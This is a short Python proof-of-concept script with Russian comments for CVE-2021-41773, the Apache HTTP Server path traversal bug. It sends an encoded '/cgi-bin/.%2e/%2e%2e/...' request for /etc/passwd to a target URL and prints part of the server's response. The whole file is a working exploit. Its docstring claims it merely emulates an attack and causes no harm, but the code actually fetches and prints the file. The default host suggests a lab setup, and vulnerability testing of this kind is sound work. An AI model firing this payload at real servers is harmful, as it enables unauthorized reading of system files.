import os
import requests


def check_cve_2021_41773(target_base_url: str):
    """
    Минимальный PoC для CVE-2021-41773 (Apache HTTP Server Path Traversal).
    Эмулирует запрос к потенциально уязвимой точке и выводит сообщение
    о возможной атаке, не нанося вреда системе.
    """
    payload_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    url = target_base_url.rstrip("/") + payload_path

    print(f"[i] Отправляем тестовый запрос к: {url}")

    try:
        response = requests.get(url, timeout=5)
    except requests.RequestException as e:
        print("[-] Не удалось отправить запрос:", e)
        return

    if response.status_code == 200:
        print("[+] Потенциальная уязвимость обнаружена (эмуляция).")
        print("[+] Первые 200 символов ответа сервера:")
        print(response.text[:200])
    else:
        print("[-] Уязвимость не подтверждена.")
        print("[-] Код ответа сервера:", response.status_code)


if __name__ == "__main__":
    target = os.getenv("TARGET_URL", "http://web:8000")
    check_cve_2021_41773(target)
